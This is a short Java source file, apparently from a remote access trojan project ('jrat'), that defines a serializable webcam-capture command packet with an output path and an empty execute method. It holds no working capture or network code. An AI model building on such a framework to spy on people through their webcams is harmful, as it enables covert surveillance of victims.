package net.jrat.core.packet.server;

import net.jrat.core.packet.IPacket;

@SuppressWarnings("unused")
public class S9PacketWebcam implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String outputpath;
	
	public S9PacketWebcam(String outputpath)
	{
		this.outputpath = outputpath;
	}
	
	@Override
	public void execute(Object object) throws Exception {}
}